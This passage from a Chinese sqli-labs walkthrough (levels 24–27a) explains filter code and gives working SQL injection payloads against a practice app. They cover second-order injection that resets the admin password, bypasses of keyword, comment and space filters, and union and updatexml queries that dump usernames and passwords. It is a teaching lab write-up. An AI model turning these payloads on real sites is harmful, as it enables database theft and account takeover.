password=&#x27;$curr_pass&#x27;</span></code></pre><p>此时就完全改变了语义，直接就修改掉了 admin 用户的密码。</p><h3 id="步骤演示"><a href="#步骤演示" class="headerlink" title="步骤演示"></a>步骤演示</h3><p>常见一个<code>admin&#39;#</code>开头的用户名，下面列举的几种都可以，以此类推，很灵活：</p><pre><code class="hljs jboss-cli">admin&#x27;<span class="hljs-comment">#1</span>admin&#x27;<span class="hljs-comment">#233</span>admin&#x27;<span class="hljs-comment">#gg</span><span class="hljs-string">...</span></code></pre><p>注册完成后数据库的记录信息如下：</p><pre><code class="hljs Bash">mysql&gt; select * from users;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb       | 0        ||  2 | Angelina   | 0        ||  3 | Dummy      | 0        ||  4 | secure     | 0        ||  5 | stupid     | 0        ||  6 | superman   | 0        ||  7 | batman     | 0        ||  8 | admin      | 0        ||  9 | admin1     | 0        || 10 | admin2     | 0        || 11 | admin3     | 0        || 12 | dhakkan    | 0        || 14 | admin4     | 0        || 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">14 rows in set (0.00 sec)</span></code></pre><p>成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。</p><p>接下来登录 `admin’#sec用户，然后来修改当前的密码：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/02.png" alt="Less-24(二次注入)"></p><p>此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了：</p><pre><code class="hljs Bash">mysql&gt; select * from users;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb       | 0        ||  2 | Angelina   | 0        ||  3 | Dummy      | 0        ||  4 | secure     | 0        ||  5 | stupid     | 0        ||  6 | superman   | 0        ||  7 | batman     | 0        ||  8 | admin      | 1234     ||  9 | admin1     | 0        || 10 | admin2     | 0        || 11 | admin3     | 0        || 12 | dhakkan    | 0        || 14 | admin4     | 0        || 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">14 rows in set (0.00 sec)</span></code></pre><h2 id="Less-25-过滤or和and"><a href="#Less-25-过滤or和and" class="headerlink" title="Less-25(过滤or和and)"></a>Less-25(过滤or和and)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><h3 id="关键代码分析："><a href="#关键代码分析：" class="headerlink" title="关键代码分析："></a>关键代码分析：</h3><pre><code class="hljs Php"><span class="hljs-comment"># id 直接单引号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 但是 id 被如下函数过滤了</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/AND/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>过滤了 <code>or</code> <code>and</code> 的get注入</p><h3 id="测试阶段"><a href="#测试阶段" class="headerlink" title="测试阶段"></a>测试阶段</h3><p><code>&#39;</code>报错 <code>&#39;&#39;</code>不报错 那么就是<code>&#39;</code>闭合</p><p>我们知道可以用<code>--+</code>注释掉后面</p><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-comment">--+</span></code></pre><p>语法不正确 发现过滤了 <code>or</code> </p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/03.png" alt="Less-25(过滤or和and)"></p><p>那么我们继续构造，3正常，4报错</p><pre><code class="hljs sql">?id=1&#x27; oorrder by 1 <span class="hljs-comment">--+</span>?id=1&#x27; oorrder by 2 <span class="hljs-comment">--+</span>?id=1&#x27; oorrder by 3 <span class="hljs-comment">--+</span>?id=1&#x27; oorrder by 4 <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/04.png" alt="Less-25(过滤or和and)"></p><h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><pre><code class="hljs sql">http://sqli.pl/Less-25/?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/05.png" alt="Less-25(过滤or和and)"></p><h3 id="爆破表名"><a href="#爆破表名" class="headerlink" title="爆破表名"></a>爆破表名</h3><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p>information 的or</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> infoorrmation_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/06.png" alt="Less-25(过滤or和and)"></p><p>爆破列名</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> infoorrmation_schema.columns  <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/07.png" alt="Less-25(过滤or和and)"></p><h3 id="爆破出数据"><a href="#爆破出数据" class="headerlink" title="爆破出数据"></a>爆破出数据</h3><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/08.png" alt="Less-25(过滤or和and)"></p><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>与 Less-25 相比，只是拼接方式改变，因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的，这里不再啰嗦。</p><pre><code class="hljs sql">?id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-26-过滤or、and、-、注释、空格和斜线"><a href="#Less-26-过滤or、and、-、注释、空格和斜线" class="headerlink" title="Less-26(过滤or、and、/*、注释、空格和斜线)"></a>Less-26(过滤or、and、/*、注释、空格和斜线)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 过滤了 or 和 and 大小写</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//strip out OR (non case sensitive)</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out AND (non case sensitive)</span><span class="hljs-comment"># 过滤了 /*</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//strip out /*</span><span class="hljs-comment"># 过滤了 -- 和 # 注释</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out --</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//Strip out #</span><span class="hljs-comment"># 过滤了空格</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out spaces</span><span class="hljs-comment"># 过滤了斜线</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out slashes</span><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>过滤了 or 和 and 可以采用 双写或者 &amp;&amp; || 绕过</p><p>过滤注释 可以使用闭合绕过</p><p>过滤了空格 可以使用如下的符号来替代：</p><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>%09</td><td>TAB 键(水平)</td></tr><tr><td>%0a</td><td>新建一行</td></tr><tr><td>%0c</td><td>新的一页</td></tr><tr><td>%0d</td><td>return 功能</td></tr><tr><td>%0b</td><td>TAB 键(垂直)</td></tr><tr><td>%a0</td><td>空格</td></tr></tbody></table><p><strong>由于我在windows下无法使用一些特殊的字符代替空格，此处是因为apache的解析的问题。</strong></p><p>直接使用报错注入</p><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><p>（在hackbar中输入&amp;&amp;时，需要自行URL编码为%26%26，否则会报错，而输入||不需要）</p><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())),<span class="hljs-number">1</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/09.png" alt="Less-25(过滤or和and)"></p><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/10.png" alt="Less-25(过滤or和and)"></p><p>but 好像不行，过滤了<code>空格</code>和<code>or</code></p><p>绕过</p><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/11.png" alt="Less-25(过滤or和and)"></p><h3 id="爆破列名"><a href="#爆破列名" class="headerlink" title="爆破列名"></a>爆破列名</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.columns)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>table_name=<span class="hljs-string">&#x27;users&#x27;</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/12.png" alt="Less-25(过滤or和and)"></p><h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><span class="hljs-string"></span><span class="hljs-string">?id=1&#x27;</span>||updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)<span class="hljs-keyword">where</span>(username=<span class="hljs-string">&#x27;admin&#x27;</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/13.png" alt="Less-25(过滤or和and)"></p><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>与 Less-26 相比，只是拼接方式改变了，<code>因为没有输出报错信息，所以不能使用报错注入了</code>，只能被迫抛弃win环境使用docker，直接上payload。</p><pre><code class="hljs sql">?id=999&#x27;)%a0union%a0select%a01,database(),3||(&#x27;1&#x27;)=(&#x27;1?id=999&#x27;)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span><span class="hljs-string"></span><span class="hljs-string">?id=999&#x27;</span>)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.columns)<span class="hljs-keyword">where</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span><span class="hljs-string"></span><span class="hljs-string">?id=999&#x27;</span>)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-27-过滤了很多"><a href="#Less-27-过滤了很多" class="headerlink" title="Less-27(过滤了很多)"></a>Less-27(过滤了很多)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>查看代码，过滤规则又增加了许多：</p><pre><code class="hljs php"><span class="hljs-comment"># 过滤了 /*</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 -</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 #</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了空格</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 select /m 严格模式 不可以使用双写绕过</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/Select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/SELECT/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 union UNION</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/Union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/UNION/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><blockquote><p>PHP语法</p></blockquote><blockquote><p>正则表达式</p></blockquote><p><a href="http://php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers">PHP正则表达式的模式修饰符（官方文档）</a><br><a href="http://www.php.cn/php-weizijiaocheng-354831.html">PHP正则中的i,m,s,x,e</a></p><blockquote><ul><li><code>i</code><br>如果设定了此修正符，模式中的字符将同时匹配大小写字母。</li><li><code>m</code><br>如果设定了此修正符，行起始和行结束除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</li><li><code>s</code><br>如果设定了此修正符，模式中的圆点元字符<code>.</code>匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</li><li><code>x</code><br>如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的<code>#</code>以及下一个换行符之间的所有字符，包括两头，也都被忽略。</li><li><code>e</code><br>如果设定了此修正符，<code>preg_replace()</code>在替换字符串中对逆向引用作正常的替换。</li><li><code>?</code><br>在<code>.</code>/<code>+</code>/<code>*</code>之后表示非贪婪匹配，<code>.</code>/<code>+</code>/<code>*</code>限定符都是贪婪的，它们会尽可能多的匹配文字，在它们的后面加上一个<code>?</code>就可以实现非贪婪或最小匹配。</li></ul></blockquote><p>union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过。</p><pre><code class="hljs bash"><span class="hljs-comment"># 大小写混写</span>unioNunIonseLect...<span class="hljs-comment"># 嵌套双写</span>uunionnionsselectelectununionion...</code></pre><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>单引号字符型，过滤掉了#,–,空格等字符</p><pre><code class="hljs sql">?id=1&#x27;||&#x27;1&#x27;=&#x27;1</code></pre><p>成功闭合<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/14.png" alt="Less-27"></p><h3 id="判断数据库名"><a href="#判断数据库名" class="headerlink" title="判断数据库名"></a>判断数据库名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,database(),3%0a||&#x27;1&#x27;=&#x27;1<span class="hljs-comment">#使用%0a代替空格，unIon、selEct随机大小写绕过，-被过滤了，使用999让其爆出显错位</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/15.png" alt="Less-27"></p><h3 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/16.png" alt="Less-27"></p><h3 id="判断列名"><a href="#判断列名" class="headerlink" title="判断列名"></a>判断列名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/17.png" alt="Less-27"></p><h3 id="得到数据"><a href="#得到数据" class="headerlink" title="得到数据"></a>得到数据</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/18.png" alt="Less-27"></p><blockquote><p>总结</p></blockquote><p>1 这里空格<code>%0a</code>代替</p><p>2这里正则表达式是只要你含有 就会一直匹配 双写不能绕过</p><p>3当-1不能用的时候 随便用一个错误的值把显示的位置让出来 给你要的数据</p><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-27 